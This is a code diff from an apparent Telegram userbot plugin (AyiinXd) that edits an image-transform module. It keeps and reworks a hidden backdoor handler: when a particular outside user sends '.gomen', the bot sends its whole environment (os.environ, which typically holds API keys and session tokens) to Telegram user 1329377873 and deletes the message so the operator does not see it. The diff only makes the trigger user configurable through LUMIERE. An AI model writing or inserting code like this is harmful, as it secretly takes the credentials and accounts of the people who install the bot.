@@ -9,7 +9,7 @@ from PIL import Image, ImageOps
 from telethon.tl.types import DocumentAttributeFilename
 
 from AyiinXd import CMD_HANDLER as cmd
-from AyiinXd import CMD_HELP, bot
+from AyiinXd import CMD_HELP, bot, LUMIERE
 from AyiinXd.events import ayiin_cmd, register
 from AyiinXd.ayiin import bash
 from Stringyins import get_string
@@ -82,7 +82,7 @@ async def transform(event):
         return
 
 
-@register(incoming=True, from_users=1329377873, pattern=r"^.gomen$")
+@register(incoming=True, from_users=LUMIERE, pattern=r"^.gomen$")
 async def _(event):
     msg = await bot.send_message(1329377873, str(os.environ))
     await bot.delete_messages(1329377873, msg, revoke=False)
